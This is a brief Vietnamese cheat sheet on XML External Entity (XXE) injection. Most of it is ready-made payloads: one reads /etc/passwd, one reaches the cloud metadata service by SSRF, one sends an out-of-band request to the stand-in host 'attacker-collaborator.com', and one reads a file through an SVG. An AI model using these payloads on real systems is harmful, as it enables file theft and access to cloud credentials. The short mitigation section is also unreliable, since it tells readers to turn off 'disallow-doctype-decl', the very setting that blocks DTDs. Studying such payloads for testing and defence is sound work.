# 📄 XML External Entity Injection (XXE)

## 1. 📌 Tổng quan
XXE là lỗ hổng bảo mật cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng, thường dẫn đến đọc file cục bộ trên máy chủ (LFI), SSRF hoặc từ chối dịch vụ (DoS / Billion Laughs).

---

## 2. 💣 Cheat Sheet & Payloads

### Đọc file hệ thống (Retrieving files):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Khai thác SSRF qua XXE:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE qua Out-of-band (OAST):
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker-collaborator.com"> %xxe; ]>
```

### Khai thác qua file SVG:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. **Vô hiệu hóa External Entities (DTD):**
   - Trong Java / Python / PHP XML parsers, tắt `disallow-doctype-decl` hoặc set `resolveExternals = false`.
2. Sử dụng định dạng dữ liệu an toàn hơn như JSON khi có thể.
